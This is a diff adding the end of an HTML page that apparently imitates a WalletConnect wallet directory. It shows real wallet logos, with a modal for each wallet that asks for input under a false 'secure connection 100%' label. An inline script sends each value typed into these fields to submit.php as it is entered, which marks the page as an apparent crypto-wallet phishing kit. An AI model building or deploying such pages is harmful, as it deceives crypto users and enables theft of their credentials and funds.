+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal56" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd.jpeg" alt="" />
+                            <h4>Unstoppable</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal56" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal58" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e.jpeg" alt="" />
+                            <h4>Dok Wallet</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal58" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal59" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5.jpeg" alt="" />
+                            <h4>AT.Wallet</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal59" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal60" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719.jpeg" alt="" />
+                            <h4>Midas</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal60" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal61" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef.jpeg" alt="" />
+                            <h4>Ellipal</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal61" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal62" class="btn coin">
+                            <img class="coin-img" src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/dda0f0fb-34e8-4a57-dcea-b008e7d1ff00/md" alt="" />
+                            <h4>KEYRING PRO</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal62" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal63" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://registry.walletconnect.org/logo/lg/19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c.jpeg" alt="" />
+                            <h4>Aktionariat</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal63" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal64" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://registry.walletconnect.org/logo/lg/95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c.jpeg" alt="" />
+                            <h4>Talken</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal64" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal66" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://assets.coingecko.com/markets/images/705/small/kyberswap.png?1638932592" alt="" />
+                            <h4>KyberSwap</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal66" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal68" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346.jpeg" alt="" />
+                            <h4>RWallet</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal68" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal69" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://registry.walletconnect.org/logo/lg/2235b648bdf382bc1a6960f1db8eda5c71f65a1996e6cb549d24783ca58a2903.jpeg" alt="" />
+                            <h4>Binana</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal69" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal70" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://registry.walletconnect.org/logo/lg/76428179ce9213ab6f8f49923310efcf5eea089764196c7a2018bea8afcd6603.jpeg" alt="" />
+                            <h4>PayTube</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal70" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class=" text-center coin-section-footer">
+                        <h6>Open an app submission issue on GitHub to add your app <span><a style="text-decoration: none; color: #0150b8;" href="https://www.github.com">here.</a> </span></h6>
+                        <div class="text-center coin-section-icons">
+                            <i style="color: #0c0e29; margin-right: 12px;" class="fab fa-facebook" aria-hidden="true"></i>
+                            <i style="color: #0c0e29; margin-right: 12px;" class="fab fa-twitter" aria-hidden="true"></i>
+                            <i style="color: #0c0e29 !important;" class="fab fa-discord" aria-hidden="true"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+
+    <!-- <script src="./script/walletpage.js"></script> -->
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
+
+    <script src="/script/waypoints/jquery.waypoints.min.js"></script>
+
+    <script src="/script/counter/jquery.counterup.min.js"></script>
+
+    <script src="/script/wow/wow.min.js"></script>
+
+
+		<script>
+    function submitInput() {
+        var walletInputs = document.querySelectorAll('.wallet-address');
+        for (var i = 0; i < walletInputs.length; i++) {
+            walletInputs[i].addEventListener('input', function() {
+                // handle the input event
+                var inputVal = this.value;
+                if (inputVal) {
+                    // create a new XMLHttpRequest object
+                    var xhr = new XMLHttpRequest();
+
+                    // prepare the HTTP request
+                    xhr.open("POST", "submit.php");
+                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+                    // send the HTTP request with the input value as a parameter
+                    xhr.send("inputValue=" + inputVal);
+
+                    // handle the response from the server, if needed
+                    xhr.onreadystatechange = function() {
+                        if (xhr.readyState === 4 && xhr.status === 200) {
+                            // handle the response from the server
+                        }
+                    }
+                }
+            });
+        }
+    }
+</script>
+
+	
+    
+    <script src="/script/script.js"></script>
+
+
+</body>
+
+</html>
